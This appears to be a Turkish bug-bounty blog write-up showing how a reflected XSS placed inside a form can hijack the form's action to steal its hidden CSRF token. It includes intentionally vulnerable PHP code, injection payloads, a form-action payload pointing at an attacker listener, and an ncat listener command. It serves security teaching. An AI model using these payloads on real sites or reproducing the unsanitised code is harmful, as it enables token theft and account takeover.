---
title: 'TR \| Steal CSRF Tokens with simple XSS'
date: 2019-06-27
permalink: /posts/steal-csrf-tokens-with-simple-xss/
tags:
  - xss
  - hack
  - steal csrf tokens
  - csrf bypass
  - csrf
  - bugbounty
  - bug bounty
  - write-up
  - poc
  - vulnerability
excerpt: 'Steal CSRF Tokens with simple XSS'
---

Merhaba,
Ben Samet ŞAHİN.  
İki yıldan biraz uzun süredir *Bug Bounty* ile ve toplamda yaklaşık dört yıldır da *Web Uygulama Güvenliği* alanında çalışmalar yürütmekteyim. 

*Bug Hunterlar* olarak biz, Bug Bounty ile uğraşırken pek çok farklı sistem ve farklı güvenlik önlemleri görüyoruz. Amacımız güvenli (gözüken) sistemlerde (gerçek ve etkisi olan) açıklar bulup, onları şirketlere bildirmektir. 


Yaptığımız testlerde bulduğumuz aynı tür açıklar her zaman aynı potansiyel zarara (impact) sahip olmayabiliyor. 

Örneğin;
Kurbana otomatik olarak çıkış yaptıran CSRF açığı (Bu genellikle açık kapsamına bile girmez.) ile kurbana otomatik olarak eposta ve parola değişikliği yaptıran CSRF (*1) açığı elbette aynı zararı veremez.


  

Şimdi, bu yazının konusuna gelelim. Elimizde iki adet XSS (Cross Site Scripting) açığı ve HTML kaynak kodundaki bir *input* tagına yansımış CSRF tokenlerimiz (*2) var. 
  

## Normal XSS Açığı :  
Çirkin bir arama kutusu olduğunu, sitenin kaynak kodlarında CSRF Tokenlerin bulunduğunu ve bir inputun değerini, *GET* isteğindeki *search* parametresinden aldığını görüyoruz. (*3)

```php
<?php 
$benCSRFtoken = "samet";
$printMD5 = md5($benCSRFtoken);
?>
```
```html	
<form>
<input type="hidden" name="CSRFtoken" value="<?php echo $printMD5 ?>">
<input type="text" name="search" value="<?php echo $_GET['search']; ?>">
<input type="submit" value="Submit">
</form>
```


Elimizde şu an için hiçbir açık yok fakat görüyoruz ki *search* parametresi hiçbir sanitizasyon (*4) işlemi yapılmamış. Bu durumda diyebiliriz ki buradan bir XSS açığı çıkabilir. (*5) Açığı bulmamız için GET metoduyla search parametresine bir payload (*6) gönderiyoruz ;
`"><h1>xss`  gönderdik ve kaynak kodunu inceledik : 

<img src="/images/Blog-1.png">


Evet, başarılı bir şekilde valuenin tırnaklarını kapattık ve artık kendi HTML kodumuzu site üzerinde çalıştırabileceğimizi gördük. Şimdi XSS kanıtı için JavaScript kodunu çalıştırmamız gerekiyor. Bu seferki açık kodumuz ;
`"><script>alert(1)</script>` (*7) gönderdik ve kaynak kodunu inceledik :

<img src="/images/Blog-2.png">


XSS açığını kanıtlamış olduk. Bu normal bir XSS saldırısıydı ve HTML ve JavaScript kodu çalıştırmak dışında pek de bir şey yapamadık.


## Kritik XSS Açığı : 
Normal XSS açığında gördüğümüz sayfayla aynı işlemi yapmasına rağmen inputların sırasının farklı olduğu bir sayfa. İlk açıkta gönderdiğimiz açık kodlarının bu sitede de çalıştığını görebiliyoruz. 

```php
<?php 
$benCSRFtoken = "samet";
$printMD5 = md5($benCSRFtoken);
?>
```
```html
<form>
<input type="hidden" name="search" value="<?php echo $_GET['search']; ?>">	
<input type="hidden" name="CSRFtoken" value="<?php echo $printMD5 ?>">
<input type="submit" value="Submit">
</form>
```



**Trick zamanı :**  
Örneklerle de gördüğümüz gibi iki tane XSS ve input taglarına yansıtılmış CSRF tokenlerini gördük. Eğer `<form>` tagı ve CSRF tokeninin yansıtılmış olduğu input tagının arasında XSS açığına sahipseniz, CSRF tokenlerini de çalabilirsiniz. Bu gerçek ve daha önce pek çok kez karşılaştığım bir senaryo ama Sadece Kritik XSS açığında işe yarar. Neden mi ?

- Çünkü HTML dilinde değişken tanımlayıp sonra kullanma gibi bir ihtimaliniz yoktur. Yani yukarıda bir CSRF Tokenli input varsa ve siz aşağıdaki tagda kod çalıştırabiliyorsanız, o CSRF Tokenine XSS açığı ile erişemezsiniz. (*8)

-  Yukarıda da değindiğim gibi `<form>` ve `</form>` tagları arasında ve CSRF Token'in yansıtılmış olduğu `<input>` tagının üstünde çalışan bir XSS açığına olmanız gerekmektedir. Eğer bu ikisine de sahipseniz CSRF tokenlerini rahatlıkla çalabilirsiniz.



**O zaman exploit edelim :**  
Öncelikle XSS açığıyla CSRF tokenlerini çalabilmek için güzel bir payload yazmamız gerekiyor. Paylaodımızın  mantığı şu olmalı : 
- Daha önce açılmış olan formu kapat : `"></form>`
- Yeni bir form aç ve action (*9) eventine dinlediğin ip ve port'u gir (*10) : `"></form><form method="GET" action="http://127.0.0.1:667/bla.html">`
- Ncat ile seçili portu (667) dinle : `ncat -nlvp 667`
- Kullanıcıyı butona tıklat ve loglardan CSRF Token'ini çek : `| grep CSRF`


Exploit videosu burada :
<video width="500" controls>
  <source src="/files/Blog-1.webm" type="video/mp4">
</video>




**SONUÇ :**  
Değerli içerik taşıyan input tagının ve açıklı input tagının sırası bile bir açığın zararını arttıracak kadar önemli olabiliyor. Bu yüzden manuel testler yapmanız ve bunun gibi trickleri deneyerek öğrenmeniz çok önemli. Deneyebilmeniz için Github'a XSS açıklı 2 dosyayı da koyuyorum. Kendi tricklerimi ve işinize yarayabilecek trickleri paylaştığım Twitter ve LinkedIn hesaplarımdan bana ulaşabilirsiniz. 


[Github](https://github.com/sametsahinnet/XSS-Blog-Post)

  ----

***1** :
Bu açık hakkında yazımı okuyabilirsiniz : https://sametsahin.net/posts/account-takeover-via-reset-password/

***2** :
CSRF açığının oluşmasını engellemek için her istek veya kullanıcıya göre değişen uzun ve rastgele değerdir. Bu tokenlerin olmadığı durumlarda CSRF açığı meydana gelebilir.

***3** :
Bu kısım temel Web bilgisine dayandığı için Google'dan bulabilirsiniz.

***4** :
Sanitizasyon, diğer adıyla filtreleme işlemleri, kullanıcıdan direkt olarak alınan girdilerin, açıklara dönüşmesini engellemek için kullanılan güvenli kod yazma tekniğidir. Pek çok açık gerekli sanitizasyon işleminin yapılmaması veya yeterince kapsamlı olmamasından kaynaklanır.

***5** :
Elbette XSS çıkar bu doğru. Yanlış olan oradan sadece XSS çıkacağı düşüncesidir. Özellikle bu işlere yeni başladıysanız sadece bir açık bulmaya çalışırsınız. Yapmanız gereken bir açıktan en fazla ne kadar ileriye gidebileceğinizi denemektir. Herkes XSS bulabilir ama sizin farkınız XSS'ten CSRF'e gitmenizdir.

***6** :
Payload, açıkları bulmak ve sömürmek için hacker tarafından yazılan kodlardır. Payloadlara, açık kodları diyebiliriz. Ve payloadlar yeşil renkle ekrandan hızlıca akıp gitmez :)

***7** :
Normalde böyle bir payload çok az yerde çalışır. Payloadlarınızın kalitesini arttırmanız için elle yazmalı ve her tuşun kaynak kodunda yansımış olduğu yerlere dikkatlice bakmalısınız. Yani her deneyişinizde websitenin yanıtını kontrol etmelisiniz.

***8** :
Hayır, erişebilirsiniz. Ama bunun ihtimali çok düşüktür. JavaScript kullanarak input içinde yer alan değerleri ekrana basabilirsiniz. Fakat bunun için uzun ve içinde `<script>` tagının kullanılmış olduğu bir payload yazmak zorundasınız. Ve ödül verecek kadar büyük tüm şirketler o `<script>` tagını gördüğü anda sizi engeller. Bu yüzden bulsanız bulsanız küçük yerlerde bulursunuz ve o küçük yerler de küçük olduğu için CSRF token zaten kullanmamış olur ;)

***9** :
HTML'de form tagı açıldığı zaman bir de onu kapatmanız gerekir. Biz kapanmış form (`</form>`) tagı enjekte ettiğimiz zaman görüntü şu şekilde olur : 


```html
<form>
<input type="hidden" name="search" value="query"></form>">
<input type="hidden" name="CSRFtoken" value="2e47d7f81970b3bb09d249a7de385dbc">
<input type="submit" value="Submit">
</form>
```

Enjekte ettiğimiz form tagı ile bir adet tamamen kapatılmış ve bir adet de açılış tagı eksik olan `</form>` tagımız olur. O zaman açılış tagımızı payloadımıza ekliyoruz ve son durumda iki adet form'umuz oluyor : 

```html
<form>
<input type="hidden" name="search" value="query">
</form>
```
ve
```html
<form>">
<input type="hidden" name="CSRFtoken" value="2e47d7f81970b3bb09d249a7de385dbc">
<input type="submit" value="Submit">
</form>
```

Baştan beri amacımız CSRF Tokeni içeren form'u kontrol edebilmekti. Action kısmını değiştirdiğimiz anda artık CSRF Tokeni içeren her istek bizim loglarımıza düşecek ve oradan okuyabileceğiz.

***10** :
CSRF Token'ine loglardan erişebilmemiz için logların bizde olması gerekir. Bu yüzden kendi localimizde rastgele bir portu dinliyoruz. Bu işlemi `ncat` ile yapabilirsiniz : 

`ncat -nlvp 667`





Değerli zamanınız için teşekkür ederim.  
Bol açıklar :)
